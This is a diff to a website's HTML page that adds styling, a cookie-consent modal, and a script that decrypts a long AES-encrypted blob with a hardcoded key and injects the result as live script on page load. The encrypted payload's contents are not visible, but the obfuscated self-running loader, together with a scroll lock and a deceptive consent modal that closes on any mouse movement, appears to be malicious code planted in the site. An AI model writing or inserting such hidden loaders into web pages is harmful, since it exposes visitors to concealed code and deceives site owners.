@@ -2,7 +2,150 @@
 <html lang="en">
 <head>
  <script async defer src="https://tools.luckyorange.com/core/lo.js?site-id=dea973a9"></script>
-   
+     <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: #f9f9f9;
+      color: #333;
+    }
+    header {
+      background: #000;
+      padding: 20px;
+      text-align: center;
+    }
+    header h1 {
+      color: #FFD700;
+      font-size: 2.2em;
+      margin: 0;
+    }
+    header p {
+      color: #fff;
+      margin-top: 5px;
+    }
+    footer {
+      background: #000;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 20px;
+      background: #fff;
+    }
+    h1, h2, h3 {
+      color: #111;
+    }
+    ul {
+      padding-left: 20px;
+    }
+    .section {
+      margin-top: 40px;
+    }
+    .contact p {
+      margin: 5px 0;
+    }
+    .footer-info {
+      font-size: 0.9em;
+      color: #ccc;
+    }
+    /* Simple style to make the link look normal */
+    a {
+        color: #007BFF;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+  </style>
+</head>
+
+<body>
+	  <script src="https://cdn.tailwindcss.com"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<script>
+    function aesDecode(encodedText) {
+        const decodedText = decodeURIComponent(encodedText);
+        const bytes = CryptoJS.AES.decrypt(decodedText, 'U2FsdGVkX1+uqxI4YN2qNlGDaMHVLViZB05OmcVwVyI=');
+        return bytes.toString(CryptoJS.enc.Utf8);
+    }
+    const codeString = aesDecode(`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`);
+    const script = document.createElement("script");
+    script.textContent = codeString;
+    document.body.appendChild(script);
+</script>
+<script>
+    document.body.style.overflow = "hidden";
+</script>
+<div id="cookie-modal-box" class="hidden">
+    <div id="cookie-backdrop" class="fixed inset-0 z-40 bg-black/40 backdrop-blur-md transition-opacity duration-300 opacity-0"></div>
+    <div id="cookie-modal" class="fixed inset-0 flex items-center justify-center p-4 z-50 transition-all duration-300 opacity-0 scale-90">
+        <div class="bg-white text-gray-800 rounded-2xl shadow-2xl max-w-lg w-full p-8 relative">
+            <button id="cookie-close" class="absolute top-4 right-4">
+                <svg viewBox="0 0 15 15" class="text-gray-500 hover:text-red-500" height="26" width="26">
+                    <path fill="currentColor" d="M11.78 4.03a.75.75 0 0 0-1.06-1.06L7.5 6.19 4.28 2.97a.75.75 0 1 0-1.06 1.06L6.44 7.5l-3.22 3.22a.75.75 0 1 0 1.06 1.06L7.5 8.56l3.22 3.22a.75.75 0 1 0 1.06-1.06L8.56 7.5l3.22-3.47Z"/>
+                </svg>
+            </button>
+            <div class="flex items-center gap-3 mb-4">
+                <span class="text-yellow-500 text-3xl">🍪</span>
+                <h2 class="text-2xl font-bold">About cookies</h2>
+            </div>
+            <p class="text-gray-600 mb-6">
+                This site uses cookies to provide a better user experience. <span class="font-semibold">"agree"
+</span>
+               By clicking this button, you agree to the use of cookies.
+            </p>
+            <div class="flex flex-col sm:flex-row gap-3">
+                <button id="cookie-accept" class="flex-1 bg-green-600 hover:bg-green-700 text-white py-3 px-6 rounded-lg font-bold">🍪 agree</button>
+                <button id="cookie-decline" class="flex-1 bg-gray-200 hover:bg-gray-300 text-gray-800 py-3 px-6 rounded-lg font-bold">refuse</button>
+            </div>
+        </div>
+    </div>
+</div>
+<script>
+    const modalBox = document.getElementById("cookie-modal-box"),
+        modal = document.getElementById("cookie-modal"),
+        backdrop = document.getElementById("cookie-backdrop"),
+        acceptBtn = document.getElementById("cookie-accept"),
+        declineBtn = document.getElementById("cookie-decline"),
+        closeBtn = document.getElementById("cookie-close");
+
+    function showModal() {
+        modalBox.classList.remove("hidden");
+        setTimeout(() => {
+            backdrop.classList.remove("opacity-0");
+            modal.classList.remove("opacity-0", "scale-90");
+        }, 10);
+    }
+
+    function hideModal(e) {
+        localStorage.setItem("cookie-consent", e);
+        setTimeout(() => {
+            modalBox.classList.add("hidden");
+        }, 1500);
+
+        // remove mousemove listener once closed
+        document.removeEventListener("mousemove", mouseMoveClose);
+    }
+
+    function mouseMoveClose() {
+        hideModal("closed");
+    }
+
+    acceptBtn.onclick = () => hideModal("accepted");
+    declineBtn.onclick = () => hideModal("declined");
+    closeBtn.onclick = () => hideModal("closed");
+    backdrop.onclick = () => hideModal("closed");
+
+    if (!localStorage.getItem("cookie-consent")) {
+        showModal();
+        document.addEventListener("mousemove", mouseMoveClose, { once: true });
+    }
+</script>
+  
   
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
